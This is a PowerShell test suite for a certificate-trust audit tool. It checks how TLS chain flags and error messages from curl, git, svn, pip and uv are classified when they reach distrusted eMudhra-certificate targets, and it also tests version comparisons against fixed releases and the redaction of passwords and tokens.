#requires -Version 5.1
param([string]$PythonPath)
$ErrorActionPreference='Stop'
. (Join-Path $PSScriptRoot 'Test-Emudhra.Helpers.ps1')
$script:passed=0
function Assert-Equal($Actual,$Expected,[string]$Name) {
    if ($Actual -ne $Expected) { throw "$Name expected=[$Expected] actual=[$Actual]" }
    $script:passed++
}
function Row($Tool,$Target,$Verdict) {
    [pscustomobject]@{Tool=$Tool;Target=$Target;Verdict=$Verdict}
}
function Summary($Rows) { (Get-AuditSummary -Rows $Rows -Control 'control' -Targets @('a','b')).Status }

# Real PowerShell parser; Windows PowerShell 5.1 must run this again on Windows.
foreach ($file in @(Get-ChildItem -LiteralPath $PSScriptRoot -Filter '*.ps1')) {
    $tokens=$null; $parseErrors=$null
    [void][Management.Automation.Language.Parser]::ParseFile($file.FullName,[ref]$tokens,[ref]$parseErrors)
    Assert-Equal @($parseErrors).Count 0 "Parser: $($file.Name)"
}
Initialize-AuditTlsProbe # Compile C# without making any network connection.
$untrusted=[long][Security.Cryptography.X509Certificates.X509ChainStatusFlags]::UntrustedRoot
$expired=[long][Security.Cryptography.X509Certificates.X509ChainStatusFlags]::NotTimeValid
Assert-Equal (Get-AuditChainVerdict $true $true 0 0) 'ACCEPT' 'Valid completed TLS'
Assert-Equal ((Get-AuditChainVerdict $true $false 4 $untrusted) -like 'REJECT*') $true 'Untrusted root'
Assert-Equal ((Get-AuditChainVerdict $true $false 4 ($untrusted -bor $expired)) -like 'UNKNOWN*') $true 'Mixed expiry cannot pass'
Assert-Equal ((Get-AuditChainVerdict $true $false 6 $untrusted) -like 'UNKNOWN*') $true 'Name mismatch cannot pass'
Assert-Equal ((Get-AuditChainVerdict $false $false 0 0) -like 'UNKNOWN*') $true 'Missing callback'
Assert-Equal ((Get-AuditChainVerdict $true $false 0 0) -like 'UNKNOWN*') $true 'Handshake incomplete'
# Sample flags on an updated Windows: badssl self-check and both eMudhra targets.
$selfObserved=0x01000060   # UntrustedRoot | RevocationStatusUnknown | OfflineRevocation
$targetObserved=0x04010004 # ExplicitDistrust | PartialChain | Revoked
Assert-Equal (Test-AuditSelfCheckPass $true 4 $selfObserved) $true 'Self-check: untrusted root with unknown revocation passes'
Assert-Equal (Test-AuditSelfCheckPass $true 4 $untrusted) $true 'Self-check: untrusted root alone passes'
Assert-Equal (Test-AuditSelfCheckPass $true 4 0x40) $false 'Self-check: revocation unknown without untrusted root fails'
Assert-Equal (Test-AuditSelfCheckPass $true 4 ($selfObserved -bor $expired)) $false 'Self-check: extra unrelated bit fails'
Assert-Equal (Test-AuditSelfCheckPass $true 6 $selfObserved) $false 'Self-check: name mismatch fails'
Assert-Equal (Test-AuditSelfCheckPass $false 4 $selfObserved) $false 'Self-check: missing callback fails'
Assert-Equal ((Get-AuditChainVerdict $true $false 4 $targetObserved) -like 'REJECT*') $true 'Target: explicit distrust + revoked rejects'
Assert-Equal ((Get-AuditChainVerdict $true $false 4 $selfObserved) -like 'UNKNOWN*') $true 'Target: revocation unknown stays UNKNOWN (strict)'
$base=@((Row 'tool' 'control' 'ACCEPT'),(Row 'tool' 'a' 'REJECT'),(Row 'tool' 'b' 'REJECT'))
Assert-Equal (Summary $base) 'FIXED' 'Both distinct targets'
Assert-Equal (Summary @((Row 'tool' 'control' 'UNKNOWN'),(Row 'tool' 'a' 'REJECT'),(Row 'tool' 'b' 'REJECT'))) 'UNKNOWN' 'Failed control'
Assert-Equal (Summary @((Row 'tool' 'a' 'REJECT'),(Row 'tool' 'b' 'REJECT'))) 'UNKNOWN' 'Missing control'
Assert-Equal (Summary @((Row 'tool' 'control' 'ACCEPT'),(Row 'tool' 'a' 'REJECT'),(Row 'tool' 'a' 'REJECT'))) 'UNKNOWN' 'Duplicate host is not two hosts'
Assert-Equal (Summary @($base + (Row 'tool' 'a' 'REJECT'))) 'UNKNOWN' 'Duplicates invalidate completion'
Assert-Equal (Summary @((Row 'tool' 'control' 'ACCEPT'),(Row 'tool' 'a' 'ACCEPT'),(Row 'tool' 'b' 'REJECT'))) 'VULNERABLE' 'Accepted target'
Assert-Equal (Summary @((Row 'tool' 'control' 'ACCEPT'),(Row 'tool' 'a' 'UNKNOWN'),(Row 'tool' 'b' 'REJECT'))) 'UNKNOWN' 'Unknown target'
# v2.11.5: old uv cannot prove the control request; an accepted target still counts.
Assert-Equal (Summary @((Row 'tool' 'control' 'UNKNOWN'),(Row 'tool' 'a' 'ACCEPT'),(Row 'tool' 'b' 'ACCEPT'))) 'VULNERABLE' 'Control UNKNOWN, both targets accepted'
Assert-Equal (Summary @((Row 'tool' 'control' 'UNKNOWN'),(Row 'tool' 'a' 'ACCEPT'),(Row 'tool' 'b' 'REJECT'))) 'VULNERABLE' 'Control UNKNOWN, one target accepted'
Assert-Equal (Summary @((Row 'tool' 'control' 'REJECT'),(Row 'tool' 'a' 'ACCEPT'),(Row 'tool' 'b' 'REJECT'))) 'UNKNOWN' 'Control REJECT, target accepted'
Assert-Equal (Summary @((Row 'tool' 'control' 'NONE'),(Row 'tool' 'a' 'ACCEPT'),(Row 'tool' 'b' 'REJECT'))) 'UNKNOWN' 'Control NONE, target accepted'
Assert-Equal (Summary @((Row 'tool' 'a' 'ACCEPT'),(Row 'tool' 'b' 'REJECT'))) 'UNKNOWN' 'Missing control, target accepted'
Assert-Equal (Summary @((Row 'tool' 'control' 'UNKNOWN'),(Row 'tool' 'control' 'UNKNOWN'),(Row 'tool' 'a' 'ACCEPT'),(Row 'tool' 'b' 'ACCEPT'))) 'UNKNOWN' 'Duplicated UNKNOWN control'
Assert-Equal (Summary @((Row 'tool' 'control' 'UNKNOWN'),(Row 'tool' 'a' 'ACCEPT'),(Row 'tool' 'a' 'ACCEPT'),(Row 'tool' 'b' 'REJECT'))) 'UNKNOWN' 'Control UNKNOWN, duplicated target'
Assert-Equal (Summary @((Row 'tool' 'control' 'UNKNOWN'),(Row 'tool' 'a' 'ACCEPT'))) 'UNKNOWN' 'Control UNKNOWN, missing target'
$ctrlUnknown=@(Get-AuditSummary -Rows @((Row 'tool' 'control' 'UNKNOWN'),(Row 'tool' 'a' 'REJECT'),(Row 'tool' 'b' 'REJECT')) -Control 'control' -Targets @('a','b'))
Assert-Equal $ctrlUnknown[0].Status 'UNKNOWN' 'Control UNKNOWN, both rejected is never FIXED'
Assert-Equal $ctrlUnknown[0].Reason 'Control missing, duplicated, or not ACCEPT.' 'Control UNKNOWN, both rejected: reason'
$routes=@((Row 'stdlib' 'control' 'ACCEPT'),(Row 'stdlib' 'a' 'REJECT'),(Row 'stdlib' 'b' 'REJECT'),
    (Row 'certifi' 'control' 'UNKNOWN'),(Row 'certifi' 'a' 'REJECT'),(Row 'certifi' 'b' 'REJECT'))
$summaries=@(Get-AuditSummary -Rows $routes -Control 'control' -Targets @('a','b'))
Assert-Equal (($summaries | Where-Object Tool -eq 'stdlib').Status) 'FIXED' 'Route control: stdlib'
Assert-Equal (($summaries | Where-Object Tool -eq 'certifi').Status) 'UNKNOWN' 'Route control: certifi'
# curl / Git classification. Sample texts from Windows, localized tails omitted.
$revoked='schannel: next InitializeSecurityContext failed: CRYPT_E_REVOKED (0x80092010) - '
$untrustedRoot='schannel: SEC_E_UNTRUSTED_ROOT (0x80090325) - '
Assert-Equal (Get-AuditCurlVerdict 35 "curl: (35) $revoked") 'REJECT' 'curl: revoked is exit 35'
Assert-Equal (Get-AuditCurlVerdict 60 "curl: (60) $untrustedRoot") 'REJECT' 'curl: untrusted root'
Assert-Equal (Get-AuditCurlVerdict 35 'curl: (35) schannel: next InitializeSecurityContext failed: SEC_E_CERT_EXPIRED (0x80090328) - ') 'UNKNOWN' 'curl: expired'
Assert-Equal (Get-AuditCurlVerdict 60 'curl: (60) schannel: SNI or certificate check failed: SEC_E_WRONG_PRINCIPAL (0x80090322) - ') 'UNKNOWN' 'curl: wrong name'
Assert-Equal (Get-AuditCurlVerdict 60 'curl: (60) SSL certificate problem: unable to get local issuer certificate') 'REJECT' 'curl: OpenSSL issuer'
Assert-Equal (Get-AuditCurlVerdict 0 '') 'ACCEPT' 'curl: success'
Assert-Equal (Get-AuditCurlVerdict 47 '') 'ACCEPT' 'curl: redirect limit'
Assert-Equal (Get-AuditCurlVerdict 28 "curl: (28) $revoked") 'UNKNOWN' 'curl: other exit code'
Assert-Equal (Get-AuditGitVerdict 128 "fatal: unable to access 'https://x/': $revoked") 'REJECT' 'git: revoked'
Assert-Equal (Get-AuditGitVerdict 128 "fatal: unable to access 'https://x/': schannel: next InitializeSecurityContext failed: SEC_E_CERT_EXPIRED (0x80090328) - ") 'UNKNOWN' 'git: expired'
Assert-Equal (Get-AuditGitVerdict 128 "fatal: repository 'https://x/' not found") 'ACCEPT' 'git: http-level error'
# Git 2.40.1: the smart-HTTP answer was not a repository.
Assert-Equal (Get-AuditGitVerdict 128 'fatal: https://t.example/info/refs not valid: is this a git repository?' 'https://t.example/') 'ACCEPT' 'git 2.40: info/refs not valid'
Assert-Equal (Get-AuditGitVerdict 128 'fatal: https://other.example/info/refs not valid: is this a git repository?' 'https://t.example/') 'UNKNOWN' 'git 2.40: info/refs of another host'
Assert-Equal (Get-AuditGitVerdict 128 'fatal: unable to access: Could not resolve host: x') 'UNKNOWN' 'git: DNS failure'
Assert-Equal (Get-AuditGitVerdict 0 '') 'ACCEPT' 'git: success'
Assert-Equal (Get-AuditGitVerdict 128 "fatal: unable to access 'https://CRYPT_E_REVOKED.example/': Could not resolve host: CRYPT_E_REVOKED.example" 'https://CRYPT_E_REVOKED.example/') 'UNKNOWN' 'git: token only in URL'
Assert-Equal (Get-AuditGitVerdict 128 "error: CRYPT_E_REVOKED in some unrelated message") 'UNKNOWN' 'git: token without transport failure'
Assert-Equal (Get-AuditCurlVerdict 60 "curl: (60) bad https://SEC_E_UNTRUSTED_ROOT.example/" 'https://SEC_E_UNTRUSTED_ROOT.example/') 'UNKNOWN' 'curl: token only in URL'
# svn (serf-based svn 1.14). Sample texts.
$svnHead="svn: E170013: Unable to connect to a repository at URL 'https://x'`n"
Assert-Equal (Get-AuditSvnVerdict 1 ($svnHead + 'svn: E230001: Server SSL certificate verification failed: issuer is not trusted')) 'REJECT' 'svn: issuer not trusted'
Assert-Equal (Get-AuditSvnVerdict 1 ($svnHead + "svn: E175003: The server at 'https://x' does not support the HTTP/DAV protocol") 'https://x/') 'ACCEPT' 'svn: handshake done, no DAV'
Assert-Equal (Get-AuditSvnVerdict 1 ($svnHead + "svn: E175003: The server at 'https://other' does not support the HTTP/DAV protocol") 'https://x/') 'UNKNOWN' 'svn: no DAV from another server'
Assert-Equal (Get-AuditSvnVerdict 1 ("Redirecting to URL 'https://other':`n" + "svn: E175015: The HTTP method 'OPTIONS' is not allowed on '/'") 'https://x/') 'UNKNOWN' 'svn: followed a redirect'
Assert-Equal (Get-AuditSvnVerdict 1 ("Redirecting to URL 'https://other/':`n" + 'svn: E230001: Server SSL certificate verification failed: issuer is not trusted') 'https://x/') 'UNKNOWN' 'svn: rejected after a redirect'
Assert-Equal (Get-AuditSvnVerdict 0 "Redirecting to URL 'https://other/':`nPath: ." 'https://x/') 'UNKNOWN' 'svn: success after a redirect'
Assert-Equal (Get-AuditSvnVerdict 1 ($svnHead + "svn: E175015: The HTTP method 'OPTIONS' is not allowed on '/'")) 'ACCEPT' 'svn: control, method not allowed'
Assert-Equal (Get-AuditSvnVerdict 1 ($svnHead + 'svn: E230001: Server SSL certificate verification failed: certificate has expired, issuer is not trusted')) 'UNKNOWN' 'svn: expired mixed in'
Assert-Equal (Get-AuditSvnVerdict 1 ($svnHead + 'svn: E230001: Server SSL certificate verification failed: certificate issued for a different hostname')) 'UNKNOWN' 'svn: wrong host'
Assert-Equal (Get-AuditSvnVerdict 1 ($svnHead + "svn: E175002: Unable to connect: SSL handshake failed")) 'UNKNOWN' 'svn: handshake failure without reason'
Assert-Equal (Get-AuditSvnVerdict 1 "svn: E175003: The server at 'https://E230001.example' does not support the HTTP/DAV protocol" 'https://E230001.example') 'ACCEPT' 'svn: token only in URL'
Assert-Equal (Get-AuditSvnVerdict 1 ($svnHead + "svn: E170013: Unable to connect`nsvn: E175002: Unexpected HTTP status 407 'Proxy Authentication Required'")) 'UNKNOWN' 'svn: proxy 407'
Assert-Equal (Get-AuditSvnVerdict 1 ($svnHead + 'svn: E215004: No more credentials or we tried too many times.')) 'UNKNOWN' 'svn: authentication'
Assert-Equal (Get-AuditSvnVerdict 1 ($svnHead + "svn: E175011: Repository moved permanently to 'https://y/'")) 'UNKNOWN' 'svn: redirect'
# pip download -vvv (pip 26.2). Localized truststore reasons are replaced by "<ja>".
$pu='https://t.example/'
$pipGet='https://t.example:443 "GET /emudhra-probe-nonexistent/ HTTP/1.1" 404 1587'
$pipTrust="Could not fetch URL https://t.example/emudhra-probe-nonexistent/: There was a problem confirming the ssl certificate: ('<ja>',) - skipping"
$pipOpenSsl="Could not fetch URL https://t.example/x/: There was a problem confirming the ssl certificate: HTTPSConnectionPool(host='t.example', port=443): Max retries exceeded (Caused by SSLError(SSLCertVerificationError(1, '[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed: unable to get local issuer certificate (_ssl.c:1006)'))) - skipping"
$pipDns="Could not fetch URL https://t.example/x/: connection error: Failed to resolve IP address for 't.example' ([Errno 11001] getaddrinfo failed) - skipping"
$pipExtra='https://pypi.org:443 "GET /simple/emudhra-probe-nonexistent/ HTTP/1.1" 404 13'
$revokedJa=([string][char]0x5931)+([string][char]0x52B9)   # stand-in for the localized "revoked" text
$expiredJa=([string][char]0x671F)+([string][char]0x9650)   # stand-in for the localized "expired" text
$pipTrustRevoked=$pipTrust.Replace('<ja>',$revokedJa); $pipTrustExpired=$pipTrust.Replace('<ja>',$expiredJa)
Assert-Equal (Get-AuditPipVerdict $pipGet $pu) 'ACCEPT' 'pip: HTTP response'
Assert-Equal (Get-AuditPipVerdict $pipTrustRevoked $pu @($revokedJa) @($expiredJa)) 'REJECT' 'pip: truststore reason matches a reject code'
Assert-Equal (Get-AuditPipVerdict $pipTrustExpired $pu @($revokedJa) @($expiredJa)) 'UNKNOWN' 'pip: truststore reason matches an unrelated code'
Assert-Equal (Get-AuditPipVerdict $pipTrust $pu @($revokedJa) @($expiredJa)) 'UNKNOWN' 'pip: truststore reason not recognized'
Assert-Equal (Get-AuditPipVerdict $pipTrustRevoked $pu) 'UNKNOWN' 'pip: truststore without reason texts'
Assert-Equal (Get-AuditPipVerdict $pipTrustRevoked $pu @('') @('')) 'UNKNOWN' 'pip: empty reason texts never match'
Assert-Equal (Get-AuditPipVerdict $pipOpenSsl $pu) 'REJECT' 'pip: OpenSSL issuer'
Assert-Equal (Get-AuditPipVerdict ($pipOpenSsl -replace 'unable to get local issuer certificate','certificate has expired') $pu) 'UNKNOWN' 'pip: expired is not related'
Assert-Equal (Get-AuditPipVerdict $pipDns $pu @($revokedJa)) 'UNKNOWN' 'pip: DNS failure'
Assert-Equal (Get-AuditPipVerdict "$pipTrustRevoked`n$pipExtra" $pu @($revokedJa)) 'REJECT' 'pip: extra index response is not the target'
Assert-Equal (Get-AuditPipVerdict $pipExtra $pu) 'UNKNOWN' 'pip: only another index answered'
# uv pip install --dry-run (uv 0.12.x).
$uu='https://t.example/'
$uvGet="DEBUG Sending fresh GET request for: https://t.example/emudhra-probe-x/`n"
$uvFail="error: Failed to fetch: ``https://t.example/emudhra-probe-x/```n  Caused by: error sending request for url (https://t.example/emudhra-probe-x/)`n  Caused by: client error (Connect)`n  Caused by: invalid peer certificate: "
Assert-Equal (Get-AuditUvVerdict 2 ($uvGet + $uvFail + 'UnknownIssuer') $uu) 'REJECT' 'uv: unknown issuer'
Assert-Equal (Get-AuditUvVerdict 2 ($uvGet + $uvFail + 'Revoked') $uu) 'REJECT' 'uv: revoked (native TLS)'
# uv 0.13.5 without UV_NATIVE_TLS (v2.11.6): its own root list distrusts the chain.
Assert-Equal (Get-AuditUvVerdict 2 ($uvGet + $uvFail + 'Other(OtherError(CertDistrusted))') $uu) 'REJECT' 'uv 0.13: distrusted (own root list)'
Assert-Equal (Get-AuditUvVerdict 2 ($uvGet + $uvFail + 'Other(OtherError(SomethingElse))') $uu) 'UNKNOWN' 'uv 0.13: another Other(...) reason'
Assert-Equal (Get-AuditUvVerdict 2 ($uvGet + $uvFail + 'Other(Unexpected)') $uu) 'UNKNOWN' 'uv 0.13: Other(...) of another shape'
Assert-Equal (Get-AuditUvVerdict 2 ($uvGet + $uvFail + 'Other(OtherError(UnknownIssuer))') $uu) 'UNKNOWN' 'uv 0.13: Other(OtherError(UnknownIssuer)) is not unwrapped'
Assert-Equal (Get-AuditUvVerdict 2 ($uvGet + $uvFail + 'Other(OtherError(Revoked))') $uu) 'UNKNOWN' 'uv 0.13: Other(OtherError(Revoked)) is not unwrapped'
Assert-Equal (Get-AuditUvVerdict 2 ($uvGet + $uvFail + 'Other(OtherError(CertDistrusted))_x') $uu) 'UNKNOWN' 'uv 0.13: distrusted with a suffix'
Assert-Equal (Get-AuditUvVerdict 2 ($uvGet + $uvFail + 'Other(OtherError(certdistrusted))') $uu) 'UNKNOWN' 'uv 0.13: distrusted in another case'
Assert-Equal (Get-AuditUvVerdict 2 ($uvGet + $uvFail + "Other(OtherError(CertDistrusted))`n`nhint: x") $uu) 'REJECT' 'uv 0.13: distrusted, then more lines'
Assert-Equal (Get-AuditUvVerdict 2 ($uvGet + $uvFail + "Other(OtherError(CertDistrusted))`n  cause: invalid peer certificate: Expired") $uu) 'UNKNOWN' 'uv 0.13: distrusted and expired'
# uv 0.11.4 wraps the URLs onto the next line after a box-drawing bar.
$bar=[string][char]0x2502
$uvWrapped="  Caused by: client error (Connect)`n  Caused by: invalid peer certificate: UnknownIssuer`n  x Request failed after 3 retries in 11.1s`n  |-> Failed to fetch:`n  $bar   ``https://t.example/emudhra-probe-x/```n  |-> error sending request for url`n  $bar   (https://t.example/emudhra-probe-x/)`n  |-> client error (Connect)`n  \-> invalid peer certificate: UnknownIssuer"
Assert-Equal (Get-AuditUvVerdict 2 ($uvGet + $uvWrapped) $uu) 'REJECT' 'uv 0.11: wrapped URL, unknown issuer'
Assert-Equal (Get-AuditUvVerdict 2 ($uvGet + ($uvWrapped -replace 'UnknownIssuer','Expired')) $uu) 'UNKNOWN' 'uv 0.11: wrapped URL, expired'
Assert-Equal (Get-AuditUvVerdict 2 ($uvGet + ($uvWrapped -replace '\(https://t\.example/','(https://other.example/')) $uu) 'UNKNOWN' 'uv 0.11: wrapped, another URL'
Assert-Equal (Get-AuditUvVerdict 2 ($uvGet + $uvFail + 'Expired') $uu) 'UNKNOWN' 'uv: expired'
Assert-Equal (Get-AuditUvVerdict 2 ($uvGet + $uvFail + 'NotValidForName') $uu) 'UNKNOWN' 'uv: name'
Assert-Equal (Get-AuditUvVerdict 2 ($uvGet + 'error: Unsupported `Content-Type` "text/plain" for https://t.example/emudhra-probe-x/. Expected JSON or HTML.') $uu) 'ACCEPT' 'uv: target answered'
Assert-Equal (Get-AuditUvVerdict 1 ($uvGet + "  x No solution found when resolving dependencies:`n  Because emudhra-probe-x was not found in the package registry and you require") $uu) 'ACCEPT' 'uv: 404 from the index'
Assert-Equal (Get-AuditUvVerdict 1 "  x No solution found when resolving dependencies:`n  Because emudhra-probe-x was not found in the package registry and you require" $uu) 'UNKNOWN' 'uv: not found without a request to the target (no-index etc.)'
# uv 0.7.14 / 0.9.17 do not log "Sending fresh GET request"; they log "No cache entry for:" before the request.
$uvOld="DEBUG uv 0.7.14 (e7f596711 2025-06-23)`nDEBUG No cache entry for: https://t.example/emudhra-probe-x/`nDEBUG No netrc file found`n"
Assert-Equal (Get-AuditUvVerdict 2 ('DEBUG uv 0.9.17' + "`n" + 'error: Unsupported `Content-Type` "text/plain" for https://t.example/emudhra-probe-x/. Expected JSON or HTML.') $uu) 'ACCEPT' 'uv (old): the target answered (no GET line)'
# A request to another index (a DEBUG line) makes the answer ambiguous, also when the target was asked.
Assert-Equal (Get-AuditUvVerdict 1 ($uvGet + "DEBUG Sending fresh GET request for: https://other.example/simple/emudhra-probe-x/`n  Because emudhra-probe-x was not found in the package registry") $uu) 'UNKNOWN' 'uv: target and another index asked, generic not found'
Assert-Equal (Get-AuditUvVerdict 2 ($uvGet + "DEBUG Sending fresh GET request for: https://other.example/simple/emudhra-probe-x/`n" + 'error: Unsupported `Content-Type` "text/plain" for https://t.example/emudhra-probe-x/. Expected JSON or HTML.') $uu) 'UNKNOWN' 'uv: another index asked, target answered'
Assert-Equal (Get-AuditUvVerdict 1 ($uvGet + "DEBUG Using request timeout of 30s`nDEBUG Acquired lock for ``C:\x``" + "`n  Because emudhra-probe-x was not found in the package registry") $uu) 'ACCEPT' 'uv: other DEBUG lines do not count'
# "No cache entry for:" is logged before the request: a generic "not found" may come from another index, so UNKNOWN.
Assert-Equal (Get-AuditUvVerdict 1 ($uvOld + "  x No solution found when resolving dependencies:`n  \-> Because emudhra-probe-x`n      was not found in the package registry and you require") $uu) 'UNKNOWN' 'uv (old): not found after only "No cache entry" stays UNKNOWN'
Assert-Equal (Get-AuditUvVerdict 1 ($uvOld + "DEBUG No cache entry for: https://other.example/simple/emudhra-probe-x/`n  x No solution found:`n  Because emudhra-probe-x was not found in the package registry") $uu) 'UNKNOWN' 'uv (old): target and another index, generic not found'
Assert-Equal (Get-AuditUvVerdict 2 ($uvOld + 'error: Unsupported `Content-Type` "text/plain" for https://other.example/emudhra-probe-x/. Expected JSON or HTML.') $uu) 'UNKNOWN' 'uv (old): another host answered'
Assert-Equal (Get-AuditUvVerdict 2 ($uvOld + $uvFail + 'UnknownIssuer') $uu) 'REJECT' 'uv (old): unknown issuer'
Assert-Equal (Get-AuditUvVerdict 2 ("error: Failed to fetch: ``https://other.example/x/```n  Caused by: invalid peer certificate: UnknownIssuer") $uu) 'UNKNOWN' 'uv: another index failed'
Assert-Equal (Get-AuditUvVerdict 2 "error: Failed to fetch: ``https://t.example/x/```n  Caused by: dns error" $uu) 'UNKNOWN' 'uv: DNS failure'
Assert-Equal (Get-AuditUvVerdict 2 ($uvGet + "error: Failed to fetch: ``https://t.example/emudhra-probe-x/```n  Caused by: error sending request for url (https://redirected.example/x/)`n  Caused by: invalid peer certificate: UnknownIssuer") $uu) 'UNKNOWN' 'uv: redirect target rejected'
Assert-Equal (Get-AuditUvVerdict 2 ($uvGet + $uvFail + "UnknownIssuer`n  Caused by: error sending request for url (https://redirected.example/x/)") $uu) 'UNKNOWN' 'uv: target and another URL in the error'
Assert-Equal (Get-AuditUvVerdict 2 ($uvGet + "error: Failed to fetch: ``https://t.example/emudhra-probe-x/```n  Caused by: error sending request for url (https://t.example.other.example/pkg/)`n  Caused by: invalid peer certificate: UnknownIssuer") $uu) 'UNKNOWN' 'uv: redirect to a host that starts with the target name'
Assert-Equal (Get-AuditUvVerdict 2 ($uvGet + "error: Failed to fetch: ``https://t.example/emudhra-probe-x/```n  Caused by: error sending request for url (https://t.example:8443/x/)`n  Caused by: invalid peer certificate: UnknownIssuer") $uu) 'UNKNOWN' 'uv: same host, other port'
# uv 0.12.22 on Linux (v2.11.4): "Failed to fetch:" without backticks and "cause:" lines;
# the Content-Type answer puts the URL in backticks.
$uvLinuxFail="error: Failed to fetch: https://t.example/emudhra-probe-x/`n  cause: error sending request for url (https://t.example/emudhra-probe-x/)`n  cause: client error (Connect)`n  cause: invalid peer certificate: UnknownIssuer`n`nhint: Consider enabling use of system TLS certificates with the ``--system-certs`` command-line flag"
Assert-Equal (Get-AuditUvVerdict 2 ($uvGet + $uvLinuxFail) $uu) 'REJECT' 'uv 0.12.22 (Linux): no backticks, unknown issuer'
Assert-Equal (Get-AuditUvVerdict 2 ($uvGet + ($uvLinuxFail -replace 'UnknownIssuer','Expired')) $uu) 'UNKNOWN' 'uv 0.12.22 (Linux): expired'
Assert-Equal (Get-AuditUvVerdict 2 ($uvGet + ($uvLinuxFail -replace 'fetch: https://t\.example/','fetch: https://other.example/')) $uu) 'UNKNOWN' 'uv 0.12.22 (Linux): another URL failed'
Assert-Equal (Get-AuditUvVerdict 1 ($uvGet + 'error: Unsupported `Content-Type` "text/plain" for `https://t.example/emudhra-probe-x/`. Expected JSON or HTML.') $uu) 'ACCEPT' 'uv 0.12.22 (Linux): target answered, URL in backticks'
Assert-Equal (Get-AuditUvVerdict 1 ($uvGet + 'error: Unsupported `Content-Type` "text/plain" for `https://other.example/emudhra-probe-x/`. Expected JSON or HTML.') $uu) 'UNKNOWN' 'uv 0.12.22 (Linux): another host answered, URL in backticks'
# Version comparison against fixed releases (Brotli CVE-2026-111497 / Pillow 13.0.0 / certifi, 2026-10-24).
$nodeFix=@('22.23.4','24.22.1','26.12.1')
Assert-Equal (Compare-AuditFixedVersion 'v24.22.1' $nodeFix) 'FIXED' 'Node: fixed release'
Assert-Equal (Compare-AuditFixedVersion '24.22.0' $nodeFix) 'VULNERABLE' 'Node: same line, older (Electron 43/44 bundle this)'
Assert-Equal (Compare-AuditFixedVersion '20.19.5' $nodeFix) 'VULNERABLE' 'Node: end-of-life line'
Assert-Equal (Compare-AuditFixedVersion '25.9.0' $nodeFix) 'VULNERABLE' 'Node: odd line between fixed lines'
Assert-Equal (Compare-AuditFixedVersion '27.0.0' $nodeFix) 'UNKNOWN' 'Node: newer than every fixed line'
Assert-Equal (Compare-AuditFixedVersion '1.3.1' @('1.4.4') -LineParts 0) 'VULNERABLE' 'Bun: older'
Assert-Equal (Compare-AuditFixedVersion '1.4.4' @('1.4.4') -LineParts 0) 'FIXED' 'Bun: fixed'
Assert-Equal (Compare-AuditFixedVersion '12.3.0' @('13.0.0') -LineParts 0) 'VULNERABLE' 'Pillow: 12.3.0'
Assert-Equal (Compare-AuditFixedVersion '13.0.0' @('13.0.0') -LineParts 0) 'FIXED' 'Pillow: 13.0.0'
Assert-Equal (Compare-AuditFixedVersion '2024.8.30' @('2026.10.19') -LineParts 0) 'VULNERABLE' 'certifi: 2024'
Assert-Equal (Compare-AuditFixedVersion '2026.10.23' @('2026.10.19') -LineParts 0) 'FIXED' 'certifi: 2026.10.23'
$libFix=@('1.0.10','1.1.1','1.2.1')
Assert-Equal (Compare-AuditFixedVersion '1.2.0' $libFix -LineParts 2) 'VULNERABLE' 'libbrotli: 1.2.0'
Assert-Equal (Compare-AuditFixedVersion '1.2.1' $libFix -LineParts 2) 'FIXED' 'libbrotli: 1.2.1'
Assert-Equal (Compare-AuditFixedVersion '1.0.9' $libFix -LineParts 2) 'VULNERABLE' 'libbrotli: 1.0.9'
Assert-Equal (Compare-AuditFixedVersion '1.1.0' $libFix -LineParts 2) 'VULNERABLE' 'libbrotli: 1.1.0 (Ubuntu 24.04, .NET)'
Assert-Equal (Compare-AuditFixedVersion '1.1.0.0' @('1.2.1.0') -LineParts 0) 'VULNERABLE' 'brotlicffi: 4-part'
Assert-Equal (Compare-AuditFixedVersion '' $nodeFix) 'UNKNOWN' 'empty version'
Assert-Equal (Compare-AuditFixedVersion 'unknown' $nodeFix) 'UNKNOWN' 'unparsable version'
Assert-Equal (Compare-AuditFixedVersion '13.0.0rc1' @('13.0.0') -LineParts 0) 'UNKNOWN' 'pre-release rc'
Assert-Equal (Compare-AuditFixedVersion '13.0.0.dev0' @('13.0.0') -LineParts 0) 'UNKNOWN' 'dev release'
Assert-Equal (Compare-AuditFixedVersion 'v24.22.1-rc.1' $nodeFix) 'UNKNOWN' 'Node pre-release'
Assert-Equal (Compare-AuditFixedVersion '1.4.4-canary' @('1.4.4') -LineParts 0) 'UNKNOWN' 'Bun canary'
Assert-Equal (Compare-AuditFixedVersion '1.2.3.4.5' $libFix -LineParts 2) 'UNKNOWN' 'five parts'
Assert-Equal (Compare-AuditFixedVersion '99999999999.1.0' $nodeFix) 'UNKNOWN' 'overflowing number'
Assert-Equal (Compare-AuditFixedVersion '13.0' @('13.0.0') -LineParts 0) 'FIXED' 'fewer parts equal the fixed release'
# Same bounds as the WSL awk comparison (cmpv in 6.4).
Assert-Equal (Compare-AuditFixedVersion '1000000000.0.0' @('13.0.0') -LineParts 0) 'FIXED' 'ten-digit part'
Assert-Equal (Compare-AuditFixedVersion '2147483647.0.0' @('13.0.0') -LineParts 0) 'FIXED' 'int32 max'
Assert-Equal (Compare-AuditFixedVersion '2147483648.0.0' @('13.0.0') -LineParts 0) 'UNKNOWN' 'above int32'
Assert-Equal (Compare-AuditFixedVersion '000000000013.0.0' @('13.0.0') -LineParts 0) 'FIXED' 'leading zeros'
Assert-Equal (Compare-AuditFixedVersion '1.2.1' @('1.2.1.0') -LineParts 0) 'FIXED' 'three parts against a four-part fixed release'
# Secrets are masked before saving (environment variables, native stderr).
$jto="-Djavax.net.ssl.trustStorePassword='alpha beta' -Djavax.net.ssl.trustStore=C:\x -Dkey.pass=`"q`nr`" -Dtoken=abc"
$masked=Hide-AuditSecret $jto
Assert-Equal ($masked -match 'alpha|beta|q\s*r|abc') $false 'Secret: quoted, multi-line and bare values masked'
Assert-Equal ($masked -like '*-Djavax.net.ssl.trustStore=C:\x*') $true 'Secret: unrelated value kept'
Assert-Equal (Hide-AuditSecret 'token="alpha\" beta" x=1') 'token=<redacted> x=1' 'Secret: escaped double quote'
Assert-Equal (Hide-AuditSecret "pwd='alpha\' beta' x=1") 'pwd=<redacted> x=1' 'Secret: escaped single quote'
Assert-Equal (Hide-AuditSecret "token=`"alpha\`nbeta`" x=1") 'token=<redacted> x=1' 'Secret: backslash before LF'
Assert-Equal (Hide-AuditSecret "token=`"alpha\`r`nbeta`" x=1") 'token=<redacted> x=1' 'Secret: backslash before CRLF'
Assert-Equal (Hide-AuditSecret '"-Djavax.net.ssl.trustStorePassword=alpha beta" -Dx=1') '<redacted> -Dx=1' 'Secret: whole quoted argument'
